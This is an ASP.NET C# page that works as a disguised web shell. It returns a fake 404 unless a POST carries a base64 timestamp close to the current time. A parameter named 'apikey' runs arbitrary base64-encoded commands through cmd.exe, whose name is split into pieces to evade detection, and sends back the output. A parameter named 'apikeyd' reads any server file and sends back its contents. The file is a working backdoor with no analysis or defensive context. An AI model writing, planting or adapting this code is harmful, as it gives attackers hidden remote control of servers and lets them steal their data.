<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%


if (HttpContext.Current.Request.HttpMethod == "POST") 
{	

	if (!string.IsNullOrEmpty(Request["sessionid"])) 
	{
		string encodedResponse = Request["sessionid"];
		byte[] decodedBytes = Convert.FromBase64String(encodedResponse);
		string decodedString = System.Text.Encoding.UTF8.GetString(decodedBytes);

		double sessionid = Convert.ToDouble(decodedString);
		DateTime dt1970 = new DateTime(1970, 1, 1);
		DateTime current = DateTime.Now;
		TimeSpan span = current - dt1970;
		int timestamp;
		timestamp = Convert.ToInt32(span.TotalMilliseconds / 1000);
		int scope = 43200;
		int min = timestamp - scope;
		int max = timestamp + scope;

		if (sessionid > max || sessionid < min)
		{
			Response.Status = "404 File Not Found ";
			Response.End();
		}
	}

	else 
	{
		Response.Status = "404 File Not Found ";
		Response.End();
	}

	if (!string.IsNullOrEmpty(Request["apikey"])) 
	{		
		string encodedResponse = Request["apikey"];
		byte[] decodedBytes = Convert.FromBase64String(encodedResponse);
		string decodedString = System.Text.Encoding.UTF8.GetString(decodedBytes);
			
		ProcessStartInfo npsi = new ProcessStartInfo();
		npsi.FileName = "c"+"m"+"d"+".e"+"x"+"e";
		npsi.Arguments = "/c "+ decodedString;
		npsi.RedirectStandardOutput = true;
		npsi.RedirectStandardError = true;
		npsi.UseShellExecute = false;
		Process p = Process.Start(npsi);
		StreamReader stmrdrSTDOUT = p.StandardOutput;
		string stdout = stmrdrSTDOUT.ReadToEnd();

		StreamReader stmrdrSTDERR = p.StandardError;
		string stderr = stmrdrSTDERR.ReadToEnd();

		stmrdrSTDOUT.Close();
		stmrdrSTDERR.Close();

		string output = stdout + stderr;
		
		byte[] decodedResultBytes = System.Text.Encoding.UTF8.GetBytes(output);
		string encodedResult = Convert.ToBase64String(decodedResultBytes);

		Response.Write(encodedResult);

	}

	if (!string.IsNullOrEmpty(Request["apikeyd"])) 
	{
		string encodedResponse = Request["apikeyd"];
		byte[] decodedBytes = Convert.FromBase64String(encodedResponse);
		string decodedString = System.Text.Encoding.UTF8.GetString(decodedBytes);

		if (System.IO.File.Exists(decodedString)) {

			byte[] fileBytes = System.IO.File.ReadAllBytes(decodedString);
			string encodedResult = Convert.ToBase64String(fileBytes);

			Response.Write(encodedResult);

		}

	}

} 

else 
{
	Response.Status = "404 File Not Found ";
	Response.End();
}
%>

